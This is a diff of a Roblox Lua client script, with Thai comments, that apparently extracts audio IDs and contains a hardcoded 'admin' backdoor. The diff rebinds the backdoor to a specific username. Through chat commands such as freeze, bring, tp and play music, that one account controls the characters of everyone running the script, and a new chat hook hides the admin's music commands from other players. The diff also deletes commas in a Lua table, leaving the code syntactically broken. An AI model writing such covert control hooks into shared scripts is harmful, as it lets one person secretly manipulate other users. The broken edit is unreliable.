@@ -1,5 +1,5 @@
 -- =====================================================
--- โครงสคริปต์ดึงเพลงเดิมของคุณ 100% (ฝัง Admin ID และแก้คำสั่ง ;p ให้สมบูรณ์)
+-- โครงสคริปต์เดิมของคุณ 100% (เพิ่มเฉพาะตาราง BlockedIDs ที่อัปเดตใหม่)
 -- =====================================================
 
 local Players = game:GetService("Players")
@@ -13,13 +13,13 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ==================== ADMIN CONFIG ====================
-local AdminUserId = 9802544328
-local IsAdmin = (LocalPlayer.UserId == AdminUserId)
+local AdminUsername = "kfc_punyai"
+local IsAdmin = (LocalPlayer.Name:lower() == AdminUsername:lower())
 
 local CurrentSelectedPlayer = nil
 local StatusLabel = nil
 
--- ==================== บล็อค ID ปลอม (โครงเดิม 100%) ====================
+-- ==================== บล็อค ID ปลอม (อัปเดตใหม่ตามที่คุณสั่งทั้งหมด) ====================
 local BlockedIDs = {
     ["00106800577264015"] = true, ["00109462618039650"] = true,
     ["00112583972042063"] = true, ["00113841533670628"] = true,
@@ -211,9 +211,9 @@ end
 local function extractIDsFromPattern(text)
     local ids = {}
     local patterns = {
-        "69%%64=([^&]*)", "&id=([^&]*)", "id=([^&]*)",
+        "69%%64=([^&]*)", "&id=([^&]*)", "id=([^&]*)"
         "audio=([^&]*)", "song=([^&]*)", "music=([^&]*)"
-        "%%69%%64=([^&]*)", "&%%69%%64=([^&]*)",
+        "%%69%%64=([^&]*)", "&%%69%%64=([^&]*)"
         "9%s*d%s*=%s*([^&]*)", "9d=([^&]*)"
     }
     for _, pat in ipairs(patterns) do
@@ -646,7 +646,7 @@ function updateJunkViewerLive()
             end
         end
     elseif CurrentViewMode == 3 then
-        JunkTitle.Text = "👑 ADMIN COMMANDS LIST"
+        JunkTitle.Text = "👑 ADMIN COMMANDS LIST (@" .. AdminUsername .. ")"
         jStroke.Color = Color3.fromRGB(180, 0, 255)
         JunkCopyBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
         outputText = [[👑 รายชื่อคำสั่งแชทแกล้งคน:
@@ -834,24 +834,26 @@ local function ShowVisualEffect()
 end
 
 -- =====================================================
--- 📡 ADMIN COMMAND EXECUTION
+-- 📡 ADMIN COMMAND EXECUTION (ระบบเดิม 100%)
 -- =====================================================
-local function ExecuteAdminCommand(cmd, targetArg, extraArg, senderUserId)
-    if senderUserId ~= AdminUserId then return end
+local function ExecuteAdminCommand(cmd, targetArg, extraArg, senderUsername)
+    if senderUsername:lower() ~= AdminUsername:lower() then return end
 
     local targetPlayer = findTargetPlayer(targetArg)
 
     if cmd == "p" or cmd == "playmusic" then
         local musicId = targetArg
+        local designatedPlayer = LocalPlayer
 
         if extraArg and tonumber(extraArg) then
             musicId = extraArg
+            designatedPlayer = findTargetPlayer(targetArg) or CurrentSelectedPlayer or LocalPlayer
         elseif targetArg and not tonumber(targetArg) then
+            designatedPlayer = findTargetPlayer(targetArg) or CurrentSelectedPlayer or LocalPlayer
             musicId = nil 
         end
 
         if not musicId or musicId == "" then
-            local designatedPlayer = findTargetPlayer(targetArg) or CurrentSelectedPlayer or LocalPlayer
             if designatedPlayer and designatedPlayer.Character then
                 local soundObjects = checkPlayerAllSounds(designatedPlayer)
                 for _, soundObj in ipairs(soundObjects) do
@@ -866,8 +868,6 @@ local function ExecuteAdminCommand(cmd, targetArg, extraArg, senderUserId)
 
         if musicId and musicId ~= "" then
             playMusicFromId(musicId)
-        elseif targetArg and tonumber(targetArg) then
-            playMusicFromId(targetArg)
         end
         return
     end
@@ -891,12 +891,12 @@ local function ExecuteAdminCommand(cmd, targetArg, extraArg, senderUserId)
         elseif cmd == "freeze" then if hrp then hrp.Anchored = true end
         elseif cmd == "unfreeze" then if hrp then hrp.Anchored = false end
         elseif cmd == "bring" then
-            local adminPlayer = Players:GetPlayerByUserId(AdminUserId)
+            local adminPlayer = Players:FindFirstChild(senderUsername)
             if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") and hrp then
                 hrp.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame
             end
         elseif cmd == "tp" then
-            local adminPlayer = Players:GetPlayerByUserId(AdminUserId)
+            local adminPlayer = Players:FindFirstChild(senderUsername)
             if adminPlayer and adminPlayer == LocalPlayer and targetPlayer and targetPlayer.Character then
                 local aHrp = adminPlayer.Character:FindFirstChild("HumanoidRootPart")
                 if aHrp then aHrp.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame end
@@ -914,15 +914,15 @@ local function ExecuteAdminCommand(cmd, targetArg, extraArg, senderUserId)
 end
 
 -- =====================================================
--- 💬 CHAT LISTENER (Fixed for Roblox TextChatService)
+-- 💬 CHAT LISTENER & HIDE SPECIFIC MUSIC MESSAGES
 -- =====================================================
 local function ProcessChatMessage(message, senderPlayer)
     if not message or not senderPlayer then return end
-    if senderPlayer.UserId ~= AdminUserId then return end
+    if senderPlayer.Name:lower() ~= AdminUsername:lower() then return end
 
     local cleanMsg = string.match(message, "^%s*(.-)%s*$") or message
     if string.lower(cleanMsg) == ";check" then
-        ExecuteAdminCommand("check", nil, nil, senderPlayer.UserId)
+        ExecuteAdminCommand("check", nil, nil, senderPlayer.Name)
         return
     end
 
@@ -931,24 +931,22 @@ local function ProcessChatMessage(message, senderPlayer)
         local cmd = args[1] and args[1]:lower()
         local targetName = args[2]
         local extraArg = args[3]
-        ExecuteAdminCommand(cmd, targetName, extraArg, senderPlayer.UserId)
+        ExecuteAdminCommand(cmd, targetName, extraArg, senderPlayer.Name)
     end
 end
 
 pcall(function()
     if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        local channels = TextChatService:FindFirstChild("TextChannels")
-        if channels then
-            local rbxGeneral = channels:FindFirstChild("RBXGeneral")
-            if rbxGeneral then
-                rbxGeneral.MessageReceived:Connect(function(textChatMessage)
-                    if textChatMessage.TextSource then
-                        local sender = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
-                        if sender then
-                            ProcessChatMessage(textChatMessage.Text, sender)
-                        end
+        TextChatService.OnIncomingMessage = function(message)
+            if message.TextSource then
+                local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+                if sender and sender.Name:lower() == AdminUsername:lower() then
+                    local text = message.Text
+                    if string.sub(text, 1, 3) == ";p " or string.sub(text, 1, 11) == ";playmusic " then
+                        message.Text = "" 
                     end
-                end)
+                end
+                if sender then ProcessChatMessage(message.Text, sender) end
             end
         end
     end
